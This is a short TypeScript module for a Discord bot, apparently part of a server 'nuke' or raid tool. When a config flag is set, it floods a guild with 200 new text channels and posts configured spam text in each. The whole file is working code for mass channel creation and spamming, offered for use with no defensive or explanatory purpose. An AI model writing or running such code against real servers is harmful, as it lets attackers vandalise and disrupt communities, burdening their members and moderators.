import { Guild, ChannelType } from "discord.js";
import Config from "../config/Config";

export default async (guild: Guild): Promise<void> => {
	if (Config.ChannelsFlood) {
		try {
			for (let i = 0; i < 200; i++) {
				const channel = await guild.channels.create({
					name: Config.ChannelsFloodName,
					type: ChannelType.GuildText,
				});

				await channel.send(Config.ChannelsFloodText);
			}
		} catch (error) {
			console.log(error);
		}
	}
};
